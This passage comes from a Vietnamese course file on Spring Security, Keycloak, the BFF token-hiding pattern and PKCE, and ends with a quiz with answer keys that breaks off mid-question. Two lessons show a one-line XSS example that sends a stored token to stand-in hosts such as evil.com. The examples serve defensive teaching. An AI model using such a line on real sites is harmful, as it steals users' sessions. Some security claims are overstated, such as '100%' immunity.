      "content": "\n:::target 🎯 MỤC TIÊU BÀI HỌC (10 PHÚT)\n- Tổng hợp toàn bộ kiến thức Chuyên đề 5.3 thành Bản đồ Phân quyền Tập trung RBAC & ABAC cho cụm Microservices.\n- Nắm vững mô hình kiến trúc phân quyền chuẩn: Identity Provider (Keycloak) -> API Gateway -> Resource Server.\n- Sẵn sàng bước sang Chuyên đề 5.4 (Kiến trúc OAuth2 PKCE & Mô hình BFF che giấu token).\n:::\n\n:::beginner 💡 GÓC GIẢI THÍCH TRỰC QUAN: TỔNG KẾT PHÂN QUYỀN TẬP TRUNG\nHệ thống microservices của bạn giờ đây đã được quản lý danh tính theo chuẩn tập đoàn:\n- Toàn bộ việc đăng ký, đổi mật khẩu, quên mật khẩu, 2FA (OTP) được đẩy hết cho **Keycloak**.\n- Các microservices của Spring Boot chỉ việc tập trung vào việc bán hàng, tiếp nhận Bearer Token và giải mã cực nhanh tại chỗ!\n:::\n\n---\n\n## 1. Cái này là gì? (Bản Đồ Kiến Trúc Phân Quyền Microservices)\n\n```mermaid\nflowchart TD\n    KC[\"Keycloak SSO Server<br/>(Quản lý Users, Passwords, Roles)\"]\n    GW[\"Spring Cloud API Gateway<br/>(Xác thực Token đầu vào)\"]\n    S1[\"order-service (Resource Server)\"]\n    S2[\"payment-service (Resource Server)\"]\n    S3[\"inventory-service (Resource Server)\"]\n    \n    KC -.->|\"Cung cấp JWKS Caching\"| GW & S1 & S2 & S3\n    GW --> S1 & S2 & S3\n    style KC fill:#7f1d1d,stroke:#ef4444,stroke-width:2px,color:#fff\n    style GW fill:#064e3b,stroke:#10b981,stroke-width:2px,color:#fff\n```\n\n---\n\n## 4. Cạm bẫy thực tế & Best Practices\n\n1. **Checklist tốt nghiệp Chuyên đề 5.3**:\n   - [ ] Đã tách biệt máy chủ IAM (Keycloak) khỏi các service nghiệp vụ.\n   - [ ] Triển khai `KeycloakJwtAuthenticationConverter` gắn prefix `ROLE_`.\n   - [ ] Sử dụng `@PreAuthorize` bảo vệ các method nhạy cảm.\n"
    },
    {
      "id": "5-4-1",
      "type": "theory",
      "title": "Bài 5.4.1: Kiến trúc OAuth2 / OIDC: Authorization Code Flow với PKCE & Mô hình BFF",
      "minutes": 8,
      "content": "\n:::target 🎯 MỤC TIÊU BÀI HỌC (10 PHÚT)\n- Giải mã lỗ hổng kinh điển khi lưu trữ Access Token / Refresh Token trong `LocalStorage` của trình duyệt: **Nguy cơ tấn công XSS đánh cắp toàn bộ tài khoản**.\n- Hiểu kiến trúc đột phá **Backend-for-Frontend (BFF Pattern)**: Biến trình duyệt thành Stateless Cookie, giấu kín 100% JWT Token phía sau Gateway.\n- Nắm vững cơ chế **Authorization Code Flow với PKCE (Proof Key for Code Exchange)** bảo vệ ứng dụng Mobile và Single Page App (SPA).\n- Đọc hiểu 100% sơ đồ bắt tay mã khóa qua Bảng giải mã chi tiết.\n:::\n\n:::beginner 💡 GÓC GIẢI THÍCH TRỰC QUAN: TẠI SAO LƯU TOKEN TRONG LOCALSTORAGE LÀ \"TỰ SÁT\"?\n**Hình tượng \"Để chìa khóa vạn năng ngoài cửa sổ\":**\n- Bạn lưu JWT Token trong `localStorage.getItem('token')`.\n- Ngày đẹp trời, dự án của bạn cài thêm một thư viện npm bên thứ ba để vẽ biểu đồ hoặc hiển thị icon.\n- Trong thư viện đó có cài cắm mã độc (Tấn công XSS): Chỉ cần 1 dòng code JavaScript: `fetch('https://hacker.com?steal=' + localStorage.getItem('token'))`.\n- **Hacker lập tức có được chìa khóa vạn năng** và tự do rút tiền, đặt hàng dưới danh nghĩa của bạn!\n- **Giải pháp BFF (Backend-for-Frontend)**:\n  - Trình duyệt **hoàn toàn không được phép nhìn thấy JWT Token**!\n  - Trình duyệt chỉ giữ một chiếc Cookie bảo mật siêu cấp (**HttpOnly, Secure, SameSite=Strict**). Mã độc JavaScript không bao giờ chạm được vào cookie này!\n  - Gateway ở Backend mới là nơi nắm giữ JWT Token thật và chuyển tiếp cho các microservices con!\n:::\n\n---\n\n## 1. Cái này là gì? (Kiến trúc Mô Hình BFF Pattern)\n\nTrong mô hình BFF, API Gateway đóng vai trò là OAuth2 Client (Confidential Client). Mọi quy trình bắt tay PKCE và lưu trữ JWT Token đều diễn ra an toàn trên Server, trình duyệt chỉ giao tiếp với Gateway qua HttpOnly Cookie.\n\n### Sơ Đồ Kiến Trúc: Mô Hình BFF Che Giấu Token Tuyệt Đối:\n\n```mermaid\nflowchart LR\n    BROWSER[\"Browser (React / Next.js)<br/>Chỉ giữ HttpOnly Cookie!\"] <-->|\"Cookie Session (Không thể bị XSS đọc)\"| BFF[\"Spring Cloud Gateway (BFF)<br/>Lưu trữ Token an toàn trong Redis\"]\n    BFF -->|\"Gắn Bearer JWT Token thật\"| SERVICES[\"Microservices Nội Bộ<br/>(Order, Payment, Inventory)\"]\n    style BFF fill:#064e3b,stroke:#10b981,stroke-width:2px,color:#fff\n    style BROWSER fill:#1e3a8a,stroke:#3b82f6,stroke-width:2px,color:#fff\n```\n\n---\n\n## 4. Cạm bẫy thực tế & Best Practices\n\n1. **Nguyên tắc an ninh bắt buộc của Cookie BFF**:\n   - `HttpOnly`: Chặn mã độc JavaScript truy cập.\n   - `Secure`: Chỉ gửi qua đường truyền HTTPS.\n   - `SameSite=Strict`: Miễn nhiễm 100% với tấn công giả mạo CSRF.\n"
    },
    {
      "id": "5-4-2",
      "type": "practice",
      "title": "Bài 5.4.2: Triển khai Spring Cloud Gateway làm BFF Che Giấu Token Khỏi Trình Duyệt",
      "minutes": 8,
      "content": "\n### Sơ Đồ Kiến Trúc: BFF Token Relay Gateway Che Giấu Token Khỏi Trình Duyệt\n\n```mermaid\nflowchart LR\n    Browser[\"🌐 Browser (Single Page App)\"]\n    Gateway[\"🛡️ Spring Cloud Gateway (BFF)<br/>Lưu Session & Refresh Token an toàn\"]\n    Keycloak[\"🏛️ Keycloak Identity Server\"]\n    OrderSvc[\"📦 Order Microservice<br/>(OAuth2 Resource Server)\"]\n    PaySvc[\"💳 Payment Microservice<br/>(OAuth2 Resource Server)\"]\n\n    Browser -->|1. Cookie HttpOnly: SESSION_ID| Gateway\n    Gateway <-->|2. Quản lý Access & Refresh Token| Keycloak\n    Gateway -->|3. Filter: Token Relay<br/>Tiêm Header: Bearer <JWT>| OrderSvc\n    Gateway -->|4. Filter: Token Relay<br/>Tiêm Header: Bearer <JWT>| PaySvc\n\n    style Gateway fill:#065f46,stroke:#10b981,stroke-width:2px,color:#fff\n    style Browser fill:#1e293b,stroke:#64748b,color:#fff\n```\n\n\n\n:::target 🎯 MỤC TIÊU BÀI HỌC (10 PHÚT)\n- Triển khai bộ lọc **Token Relay** trong Spring Cloud Gateway: Tự động trích xuất token từ Session trên Gateway và tiêm vào Header `Authorization: Bearer <token>` trước khi đẩy xuống các Microservices con.\n- Cấu hình Redis Session lưu trữ an toàn các phiên đăng nhập BFF.\n- Đọc hiểu 100% từng dòng cấu hình Gateway qua Bảng giải mã chi tiết.\n:::\n\n\n:::beginner 💡 GÓC GIẢI THÍCH TRỰC QUAN: LỄ TÂN KHÁCH SẠN GIỮ HỘ CHIẾU\n- Khi khách hàng đến khách sạn (Trình duyệt Frontend): Lễ tân (**Spring Cloud Gateway**) giữ hộ chiếu của khách và cất vào két an toàn.\n- Lễ tân chỉ phát cho khách một chiếc thẻ từ mở cửa (**HttpOnly Cookie**).\n- Mỗi khi khách cần gọi món ăn hay dọn phòng: Lễ tân tự lấy hộ chiếu ra đối chiếu với các phòng ban nội bộ (**Token Relay**). Khách không bao giờ sợ bị kẻ gian móc túi mất hộ chiếu!\n:::\n\n---\n\n## 3. Dùng như thế nào & Phân tích từng dòng code (How-to & Line-by-line Breakdown)\n\nCấu hình Token Relay trong `application.yml` của Spring Cloud Gateway:\n\n```yaml\nspring:\n  cloud:\n    gateway:\n      routes:\n        - id: order-service-route\n          uri: lb://order-service\n          predicates:\n            - Path=/api/v1/orders/**\n          filters:\n            # TỰ ĐỘNG GẮN BEARER TOKEN TỪ SESSION VÀO REQUEST GỬI CHO ORDER-SERVICE!\n            - TokenRelay=\n            - RemoveRequestHeader=Cookie # Xóa Cookie trước khi gửi vào mạng nội bộ\n```\n\n### Bảng Giải Mã Bộ Lọc Gateway:\n\n| Bộ lọc Gateway | Ý nghĩa kỹ thuật | Lợi ích bảo mật |\n|---|---|---|\n| `TokenRelay=` | Tự động lấy Access Token từ OAuth2AuthorizedClient | Microservices con nhận được Bearer Token chuẩn mực mà không cần biết đến Cookie |\n| `RemoveRequestHeader=Cookie` | Xóa bỏ thông tin Cookie nhạy cảm | Ngăn chặn việc rò rỉ cookie session vào mạng microservices nội bộ |\n"
    },
    {
      "id": "5-4-3",
      "type": "pitfall",
      "title": "Bài 5.4.3: Cạm bẫy Lưu Token trong LocalStorage (XSS) & Token Hijacking trên Mobile",
      "minutes": 7,
      "content": "\n### Sơ Đồ Tấn Công: Đánh Cắp Token Từ LocalStorage Qua Lỗ Hổng XSS\n\n```mermaid\nsequenceDiagram\n    autonumber\n    actor Victim as 👤 Người Dùng Hợp Lệ\n    actor Hacker as 🦹 Kẻ Tấn Công\n    participant Web as 🌐 Ứng Dụng Frontend (React/Vue)\n    participant LocalStorage as 💾 Trình Duyệt LocalStorage\n    participant BFF as 🛡️ Gateway BFF (HttpOnly Cookie)\n\n    Note over Victim,LocalStorage: KỊCH BẢN NGUY HIỂM: LƯU TOKEN TRONG LOCALSTORAGE\n    Victim->>Web: Đăng nhập thành công, nhận Access Token\n    Web->>LocalStorage: Lưu token vào window.localStorage\n    Hacker->>Web: Bơm mã độc XSS qua comment độc hại: <script src=\"evil.js\">\n    Note over Web: Script độc chạy: fetch('evil.com?t=' + localStorage.getItem('token'))\n    LocalStorage-->>Hacker: Token bị đánh cắp! Hacker chiếm tài khoản hoàn toàn!\n\n    Note over Victim,BFF: KỊCH BẢN BẢO VỆ TUYỆT ĐỐI: BFF COOKIE HTTPONLY\n    Victim->>BFF: Đăng nhập thành công\n    BFF-->>Victim: Gắn Set-Cookie: SESSIONID=abc; HttpOnly; Secure; SameSite=Strict\n    Note over Victim: JavaScript (kể cả mã XSS) TUYỆT ĐỐI KHÔNG THỂ ĐỌC Cookie HttpOnly!\n```\n\n### Bảng So Sánh Các Giải Pháp Lưu Trữ Token Phía Client:\n\n| Nơi lưu trữ Token | Nguy cơ XSS | Nguy cơ CSRF | Đánh giá an ninh |\n|---|---|---|---|\n| **LocalStorage / SessionStorage** | ❌ Cực cao (Mọi mã JS đều đọc được) | Miễn nhiễm CSRF | **Nghiêm cấm dùng cho ứng dụng tài chính** |\n| **Bộ nhớ RAM JavaScript** | Trung bình (Mất token khi F5 tải lại trang) | Miễn nhiễm CSRF | Chấp nhận được nhưng trải nghiệm người dùng kém |\n| **HttpOnly, Secure Cookie (BFF)** | ⭐⭐⭐ Miễn nhiễm XSS hoàn toàn | Phòng chống bằng `SameSite=Strict` | **Tiêu chuẩn vàng cho Web Doanh nghiệp** |\n| **Mobile Encrypted Keystore** | ⭐⭐⭐ Miễn nhiễm (Phần cứng mã hóa) | Miễn nhiễm CSRF | **Tiêu chuẩn vàng cho iOS / Android Mobile App** |\n\n\n\n:::target 🎯 MỤC TIÊU BÀI HỌC (10 PHÚT)\n- Giải phẫu kịch bản tấn công Token Hijacking và XSS đánh cắp thông tin đăng nhập.\n- Bảo mật ứng dụng Mobile iOS/Android: Sử dụng Keystore / Keychain để mã hóa Refresh Token.\n- Nắm vững checklist phòng vệ chuyên sâu chuẩn ngân hàng (PCI-DSS & OWASP).\n:::\n\n\n:::beginner 💡 GÓC GIẢI THÍCH TRỰC QUAN: KẺ MÓC TÚI TRÊN XE BUÝT ĐÔNG NGƯỜI\n- Lưu JWT trong `LocalStorage` giống như bạn nhét bọc tiền 100 triệu thò ra ngoài túi quần sau khi đi xe buýt.\n- Bất kỳ một thư viện npm lạ nào có mã độc (Tấn công XSS) đều có thể thò tay rút sạch tiền của bạn trong tích tắc.\n- Hãy cất bọc tiền đó vào két sắt bí mật của ngân hàng (**HttpOnly Cookie hoặc Mobile Keychain**)!\n:::\n\n---\n\n## 4. Cạm bẫy thực tế & Best Practices\n\n1. **Tuyệt đối không lưu token dạng Plaintext trên thiết bị**:\n   - Trên Web: Dùng **HttpOnly Cookie** (Mô hình BFF).\n   - Trên Mobile: Dùng **Android EncryptedSharedPreferences** và **iOS Keychain Services**.\n"
    },
    {
      "id": "5-4-4",
      "type": "synthesis",
      "title": "Bài 5.4.4: Tổng Kết Thực Chiến: Bản Đồ Kiến Trúc BFF Che Giấu Token & Phòng Chống XSS Tuyệt Đối",
      "minutes": 8,
      "content": "\n:::target 🎯 MỤC TIÊU BÀI HỌC (10 PHÚT)\n- Tổng hợp toàn bộ kiến thức Module 5 thành Bản đồ Kiến trúc An ninh Bảo mật Đa Tầng (Enterprise Security Architecture).\n- Nắm chắc chuỗi liên kết: Browser (HttpOnly Cookie) -> BFF Gateway (Token Relay) -> Keycloak (OAuth2 SSO) -> Microservices (Stateless JWT).\n- Sẵn sàng bước sang Module 6 (Microservices Chuyên Sâu: Redis Distributed Lock, Kafka Outbox & Saga Pattern).\n:::\n\n:::beginner 💡 GÓC GIẢI THÍCH TRỰC QUAN: TỔNG KẾT MODULE 5\nBạn vừa hoàn thành một trong những module danh giá nhất của kỹ sư phần mềm:\n- **Tầng Web/Client**: Được bảo vệ 100% khỏi tấn công XSS nhờ mô hình **BFF và HttpOnly Cookie**.\n- **Tầng Gateway**: Đóng vai trò pháo đài trung chuyển, che giấu toàn bộ độ phức tạp của Token.\n- **Tầng Identity**: Tập trung hóa tại **Keycloak SSO** chuẩn OAuth2 / OpenID Connect.\n- **Tầng Microservices**: Xác thực phi tập trung siêu tốc bằng **RSA Public Keys**.\nToàn bộ hệ sinh thái của bạn giờ đây đã đạt chuẩn an ninh cấp ngân hàng thương mại!\n:::\n\n---\n\n## 1. Cái này là gì? (Bản Đồ Toàn Cảnh Module 5)\n\n### Sơ Đồ Kiến Trúc Toàn Diện: Hệ Thống Bảo Mật Cấp Doanh Nghiệp\n\n```mermaid\ngraph TD\n    subgraph M5[\"MODULE 5: BẢO MẬT JWT & KEYCLOAK\"]\n        T1[\"Chuyên Đề 5.1: Spring Security 6 & FilterChain<br/>(Stateless, CORS Preflight, No CSRF)\"]\n        T2[\"Chuyên Đề 5.2: Stateless JWT & RSA Signatures<br/>(RFC 7519, OncePerRequestFilter, RTR)\"]\n        T3[\"Chuyên Đề 5.3: OAuth2 Resource Server & Keycloak<br/>(JWKS Caching, Custom Converter, RBAC)\"]\n        T4[\"Chuyên Đề 5.4: BFF Pattern & Zero-XSS Architecture<br/>(Token Relay, HttpOnly Cookie, PKCE)\"]\n    end\n    \n    T1 --> T2 --> T3 --> T4\n    T4 ==> NEXT[\"MODULE 6: MICROSERVICES & MESSAGING<br/>(Redis Distributed Lock, Kafka Outbox, Saga)\"]\n    style M5 fill:#064e3b,stroke:#10b981,stroke-width:2px,color:#fff\n    style NEXT fill:#1e3a8a,stroke:#3b82f6,stroke-width:2px,color:#fff\n```\n\n---\n\n## 4. Cạm bẫy thực tế & Best Practices\n\n1. **Checklist tốt nghiệp Module 5**:\n   - [ ] Nắm chắc kiến trúc `SecurityFilterChain` trong Spring Security 6.\n   - [ ] Giải quyết dứt điểm lỗi CORS Preflight OPTIONS bằng `CorsConfigurationSource`.\n   - [ ] Làm chủ kỹ thuật ký số bất đối xứng RSA256 và Refresh Token Rotation.\n   - [ ] Tích hợp mượt mà với Keycloak SSO qua Custom Converter.\n   - [ ] Hiểu rõ và áp dụng mô hình BFF để bảo vệ Frontend khỏi lỗ hổng XSS.\n\n\n\n### Ma Trận Quyết Định Kiến Trúc Bảo Mật Doanh Nghiệp (Security ADR Matrix):\n\n| Kịch bản triển khai | Kiến trúc bảo mật tối ưu | Cơ chế truyền nhận | Lý do lựa chọn |\n|---|---|---|---|\n| **Hệ thống Monolith truyền thống** | Spring Security State Session | Session Cookie (`JSESSIONID`) | Đơn giản, tự động đồng bộ trạng thái trong 1 node |\n| **Web Single Page App (React/Angular)** | BFF Pattern (Spring Cloud Gateway) | HttpOnly Cookie -> Token Relay | Bảo vệ 100% Token khỏi mã độc XSS trên trình duyệt |\n| **Native Mobile App (iOS / Android)** | Authorization Code với PKCE | Header `Authorization: Bearer` | Lưu trữ Refresh Token trong Secure Enclave / Keystore |\n| **Giao tiếp Microservice nội bộ (B2B)** | OAuth2 Client Credentials Flow | mTLS + JWT Service-to-Service | Xác thực trực tiếp giữa các máy chủ không cần User |\n"
    },
    {
      "id": "5-quiz",
      "type": "quiz",
      "title": "Quiz Module 5 — Sát Hạch Toàn Diện Bảo Mật JWT & Keycloak",
      "questions": [
        {
          "level": "easy",
          "scenario": "Standup LAAS: BA nói 'user này authentication fail'. Dev trả lời 'không, là authorization fail — user login OK nhưng thiếu role'. BA nhìn bạn cầu cứu.",
          "q": "Phân biệt authentication vs authorization?",
          "options": [
            "Giống nhau — đều là 'bảo mật'",
            "Authentication = bạn là ai (đăng nhập, verify token); Authorization = bạn được làm gì (role, permission)",
            "Authentication = token; Authorization = password",
            "Authorization chạy trước authentication trong filter chain"
          ],
          "answer": 1,
          "explain": "2 câu hỏi khác nhau: 'ai' trước 'được gì'. Spring tách bạch: AuthenticationManager/SecurityFilterChain xác thực; AuthorizationFilter/@PreAuthorize phân quyền. 401 = fail cái trước, 403 = fail cái sau.",
          "why": [
            "Nhầm lẫn phổ biến khiến debug sai hướng — 401 xử lý khác 403 hoàn toàn (token vấn đề vs quyền vấn đề).",
            "✓ Đúng — thứ tự chuẩn: request phải XÁC THỰC thành công (ai gọi) rồi mới PHÂN QUYỀN (được làm gì). Login đúng role sai vẫn 403.",
            "Token/password là CƠ CHẾ (how), không phải định nghĩa (what). Password là một cách authenticate; token là proof đã authenticate.",
            "Ngược lại — không thể phân quyền khi chưa biết là ai. Filter chain: authentication filter đứng trước authorization filter."
          ]
        },
        {
          "level": "medium",
          "scenario": "Audit LAAS: dev nhét số điện thoại + email + hash password cũ vào JWT payload 'để tiện không phải query DB'. Security review gạch đỏ.",
          "q": "Vì sao payload JWT không được chứa dữ liệu nhạy cảm?",
          "options": [
            "JWT bị giới hạn 1KB nên không chứa được",
            "Payload chỉ base64url — KHÔNG mã hóa, ai cầm token decode đọc được ngay. Signature chỉ chống sửa, không chống đọc",
            "JWT tự động log ra console lộ dữ liệu",
            "Keycloak từ chối ký token có password hash"
          ],
          "answer": 1,
          "explain": "base64url là encoding không phải encryption — công cụ decode online đọc được 100% payload. Token nằm trong: browser devtools, server logs, proxy logs... Nhạy cảm trong payload = phát tờ rơi thông tin.",
          "why": [
            "Kích thước là vấn đề hiệu năng thật (header mỗi request phình to) nhưng không phải lý do bảo mật cốt lõi.",
            "✓ Đúng — JWS (JWT signed) thiết kế cho INTEGRITY (chống sửa đổi) không CONFIDENTIALITY (chép mắt). Cần confidentiality thì JWE (mã hóa payload) — phức tạp và hiếm cần.",
            "JWT có thể xuất hiện trong log nếu app log authorization header — nhưng đó là practice xấu, không phải bản chất token.",
            "Keycloak ký mù — nó không inspect payload logic của bạn. Không có lớp phòng thủ nào từ IdP."
          ]
        },
        {
          "level": "medium",
          "scenario": "Kiến trúc LAAS: Keycloak phát token, 8 microservice validate. Dev mới hỏi: 'Mỗi service phải chia sẻ secret key với Keycloak à? Thế không bị lộ?'",
          "q": "RS256 giải quyết thế nào?",
          "options": [
            "Mỗi service 1 secret riêng Keycloak quản lý qua API",
            "Bất đối xứng: Keycloak ký bằng private key (chỉ IdP giữ); service verify bằng public key tải từ JWKS endpoint /certs — công khai mà không ai giả mạo được",
            "Secret được encrypt trong biến môi trường mỗi pod",
            "Service gọi API Keycloak verify token mỗi request"
          ],
          "answer": 1,
          "explain": "Private key chỉ tồn tại Keycloak → duy nhất IdP tạo token hợp lệ. Public key công khai vô hại (chỉ verify được, không ký được). JWKS endpoint + cache + rotation tự động trong Spring oauth2-resource-server.",
          "why": [
            "N secret riêng = N điểm lộ — và service giữ secret nào cũng có thể FORGE token giả như IdP. Trả lại chính vấn đề HS256 gặp phải.",
            "✓ Đúng — phân tách ký/verify: nguy cơ tập trung 1 nơi (IdP), khả năng verify phân tán vô hạn. Đó là lý do mọi IdP thực tế dùng RSA/ECDSA.",
            "Encrypt secret vẫn là 'chia sẻ secret' —encrypt at rest không thay đổi mô hình niềm tin: 8 nơi giữ capability ký token.",
            "Gọi IdP mỗi request = điểm failure trung tâm + latency + rate limit. Toàn bộ ý nghĩa của JWT là self-contained verify cục bộ."
          ]
        },
        {
          "level": "hard",
          "scenario": "Production LAAS: service trả 401 cho token mới phát. Team họp 30 phút chưa ra. Token decode thấy iss='https://auth.laas.vn/realms/prod'. Config service: issuer-uri='https://auth.laas.vn/realms/laas'.",
          "q": "Debug 401 — thứ tự kiểm tra đúng?",
          "options": [
            "Restart Keycloak trước — thử mọi thứ",
            "exp (token còn hạn?) → iss (khớp issuer-uri?) → aud (token dành cho service này?) → clock skew (2 server lệch giờ?)",
            "Kiểm tra role user trong Keycloak console",
            "Xem DB connection — 401 có thể do DB down"
          ],
          "answer": 1,
          "explain": "401 = xác thực fail: (1) exp — hết hạn vô điều kiện reject; (2) iss — 'https://.../realms/prod' ≠ '.../realms/laas' → MISMATCH chính là case này; (3) aud — token phát cho audience khác; (4) clock skew — token iat trong tương lai theo giờ server.",
          "why": [
            "Restart-first là debug theatre — không có hypothesis, chỉ hy vọng. Mất uptime không có thông tin.",
            "✓ Đúng — checklist từ phổ biến nhất đến hiếm: token decode 30 giây ra iss mismatch ngay. Kỷ luật debug = giả thuyết → kiểm chứng → kết luận.",
            "Role thiếu → 403 (đã xác thực, từ chối quyền). Nhầm 401/403 là nhầm tầng vấn đề.",
            "DB down → 500/503. 401 nằm hoàn toàn ở tầng security filter trước khi chạm business logic."
          ]
        },
        {
          "level": "hard",
          "scenario": "Mobile LAAS: access token TTL 15 phút. User mở app sáng, trưa mở lại phải login lại — phàn nàn UX. Team cân nhắc tăng TTL lên 24h cho 'tiện'.",
          "q": "Đánh đổi TTL và giải pháp đúng?",
          "options": [
            "Tăng lên 24h — UX quan trọng hơn",
            "Giữ access token ngắn (15p) + refresh token dài (7 ngày, HttpOnly/secure storage, rotation) — app tự đổi token im lặng khi hết hạn",
            "Token không bao giờ hết hạn — server-side session nhẹ hơn",
            "Hỏi từng user muốn TTL bao lâu rồi cấu hình dynamic"
          ],
          "answer": 1,
          "explain": "Access token bị đánh cắp → cửa sổ tấn công = TTL. Ngắn = giới hạn thiệt hại. Refresh token dài NHƯNG bảo vệ hơn (HttpOnly khỏi XSS, rotation phát hiện reuse) — UX mượt mà không hy sinh an toàn.",
          "why": [
            "24h access token = kẻ đánh cắp có 24h toàn quyền API user — mỗi giờ token lộ là giờthiên tai nạn. UX sửa bằng refresh flow, không phải kéo dài exposure.",
            "✓ Đúng — tách 2 loại rủi ro: access (thường gửi đi, dễ lộ, phải ngắn) và refresh (giữ kỹ, ít lưu thông, được dài). Silent refresh là chuẩn industry.",
            "Token vĩnh viễn = credential bị lộ 1 lần vĩnh viễn compromised. Không có cơ chế thu hồi tự nhiên — hoàn toàn anti-pattern.",
            "Per-user TTL = bề mặt cấu hình phình to không giới hạn + không có mô hình đe dọa nhất quán. Security policy theo threat model, không theo survey UX."
          ]
        },
        {
          "level": "medium",
          "scenario": "Code review LAAS: API list-task chỉ có @PreAuthorize(\"hasRole('USER')\") — mọi USER đọc được task của mọi người. Yêu cầu: user chỉ xem task mình (hoặc admin).",
          "q": "Thiết kế authorization theo dữ liệu đúng?",
          "options": [
            "Thêm if-else trong controller: if (!task.owner.equals(currentUser)) throw 403",
            "@PreAuthorize(\"hasRole('ADMIN') or @taskSecurity.isOwner(#id, authentication.name)\") — SpEL delegate check ownership qua bean",
            "Lọc ở query: WHERE owner = :currentUser — không cần annotation",
            "Chuyển toàn bộ sang ACL table phức tạp"
          ],
          "answer": 1,
          "explain": "SpEL + custom bean = khai báo policy tại method, logic check trong component test được. isOwner(taskId, username) query DB so khớp — policy nhìn thấy ngay ở annotation, implementation tái sử dụng.",
          "why": [
            "Imperative if-else rải trong controller: không visible từ ngoài, dễ miss 1 endpoint, không test riêng policy. Annotation = policy as configuration.",
            "✓ Đúng — đúng tầng: declaration (annotation) tách execution (bean). Cùng pattern dùng lại mọi endpoint, audit policy = grep @PreAuthorize.",
            "Lọc query là CHIẾN LƯỢC đúng (defense in depth + hiệu năng) nhưng KHÔNG THAY THẾ method security: endpoint /tasks/{id} của người khác vẫn cần 403 rõ ràng, không phải 404 giả.",
            "ACL table là giải pháp cho mô hình permission phức tạp nhiều chiều — over-engineering cho rule 'owner hoặc admin'. Đơn giản trước, phức tạp khi cần."
          ]
        },
        {
          "level": "hard",
          "scenario": "SPA LAAS lưu access token trong localStorage. Báo cáo pentest: 1 dependency cũ có XSS — attacker đọc được toàn bộ token người dùng.",
          "q": "Kiến trúc lưu token chuẩn cho SPA?",
          "options": [
            "Encrypt token trước khi localStorage — attacker không đọc được",
            "Access token trong JS memory (biến mất khi refresh) + refresh token trong HttpOnly+Secure+SameSite=Strict cookie qua BFF/backend — XSS không chạm được refresh",
            "Chuyển sang sessionStorage — tự hết hạn khi đóng tab",
            "Lưu token trong IndexedDB với flag encrypted=true"
          ],
          "answer": 1,
          "explain": "Memory mất khi refresh trang — nhưng refresh flow (cookie HttpOnly) tự động lấy lại access mới. XSS đọc được memory ĐANG sống nhưng không đọc được cookie HttpOnly (chỉ browser tự gửi) — thiệt hại giới hạn trong phiên.",
          "why": [
            "Encrypt bằng key nào? Key cũng phải lưu đâu đó trong browser — attacker có XSS đọc được key và ciphertext cùng lúc. Mã hóa client-side tự quản là ảo tưởng.",
            "✓ Đúng — BFF (Backend for Frontend) pattern: cookie HttpOnly immune XSS (JS không đọc được), SameSite=Strict chặn CSRF, server-side session có thể revoke. Chuẩn OAuth for SPA hiện đại.",
            "sessionStorage vẫn JS-readable — XSS đọc như thường. Chỉ khác lifetime (tab), không khác security model.",
            "IndexedDB vẫn là browser storage JS truy cập được — flag encrypted không phải cơ chế, là câu thần chú."
          ]
        },
        {
          "level": "medium",
          "scenario": "Keycloak realm LAAS: ops hỏi 'realm là gì? Sao không dùng 1 realm chung cho mọi môi trường dev/sit/prod cho gọn?'",
          "q": "Realm tách biệt mua lại lợi ích gì?",
          "options": [
            "Chỉ là tên gọi — 1 realm chung cũng chẳng sao",
            "Cô lập hoàn toàn users/clients/roles/keys — môi trường nào cũng tự chủ,rò rỉ prod key không lan sang dev, test user không dính prod data",
            "Tăng hiệu năng Keycloak — mỗi realm 1 thread pool",
            "Realm là bắt buộc kỹ thuật của OAuth2"
          ],
          "answer": 1,
          "explain": "Realm = tenant boundary: users, sessions, keys, identity providers, policies. Dev realm bị XSS thử nghiệm không đe dọa prod. Rotation key prod không làm vỡ dev. Chính là 'blast radius containment' — cùng tư duy tách VPC/network.",
          "why": [
            "1 realm chung = mọi môi trường chia sẻ: user test vô tình có quyền thật, key rotate prod làm đứt dev, brute force lab khóa tài khoản prod. Môi trường phải cách ly.",
            "✓ Đúng — cùng nguyên lý schema-per-environment: độc lập vận hành, độc lập an toàn, độc lập vòng đời. Chi phí (setup realm mới) nhỏ so rủi ro chia sẻ.",
            "Realm không phải unit phân bổ tài nguyên — Keycloak multi-realm trên cùng JVM. Lý do là isolation logic không phải performance.",
            "OAuth2/OIDC spec không biết khái niệm realm — đó là concept Keycloak (và các IdP khác) thêm cho multi-tenancy."
          ]
        },
        {
          "level": "hard",
          "scenario": "Frontend React gửi request POST /api/v1/payments lên Spring Boot kèm token Authorization. Trình duyệt tự động bắn trước một request OPTIONS (Preflight) và lập tức bị trả về lỗi 401 Unauthorized, làm toàn bộ tính năng thanh toán tê liệt.",
          "q": "Nguyên nhân vì sao và cấu hình nào trong Spring Security 6 khắc phục triệt để?",
          "options": [
            "Do CORS được cấu hình trong WebMvcConfigurer thay vì Spring Security; Security FilterChain chặn trước và từ chối request OPTIONS không có token. Khắc phục: Dùng http.cors() trong SecurityFilterChain và permitAll cho HttpMethod.OPTIONS",
            "Cần cấu hình frontend gửi kèm Authorization Bearer header ngay trong request OPTIONS của trình duyệt",
            "Cần tắt chế độ HTTPS và chuyển toàn bộ sang HTTP để trình duyệt không kích hoạt Preflight",
            "Cần thêm header Access-Control-Allow-Origin: * trong file application.yml"
          ],
          "answer": 0,
          "explain": "Preflight OPTIONS do trình duyệt tự động gửi và KHÔNG BAO GIỜ mang theo Authorization header. Nếu cấu hình CORS ở tầng WebMvc thay vì SecurityFilterChain, Spring Security chạy trước sẽ chặn request OPTIONS với lỗi 401. Khắc phục: cấu hình CorsConfigurationSource trực tiếp trong SecurityFilterChain và cho phép HttpMethod.OPTIONS permitAll.",
          "why": [
            "✓ Đúng — FilterChainProxy chạy trước DispatcherServlet. Phải xử lý CORS ở Security FilterChain và permitAll request OPTIONS.",
            "Trình duyệt cấm can thiệp header vào request Preflight tự động — frontend không thể tự đính kèm Authorization header.",
            "HTTP không thay đổi Same-Origin Policy — khác domain vẫn bắn Preflight như thường, lại mất an toàn SSL.",
            "allowedOrigins(*) không giải quyết vấn đề xác thực 401 ở Security FilterChain, lại vi phạm khi allowCredentials=true."
          ]
        },
        {
          "level": "hard",
          "scenario": "Trong cuộc tấn công vào ứng dụng di động, tin tặc tạo một ứng dụng giả mạo đăng ký cùng Custom URL Scheme để đánh chặn mã ủy quyền Authorization Code. Theo chuẩn an ninh OAuth 2.1 BCP mới nhất, cơ chế nào bắt buộc phải áp dụng để ngăn chặn triệt để cuộc tấn công này?",
          "q": "Cơ chế bảo vệ bắt buộc và nguyên lý hoạt động?",
          "options": [
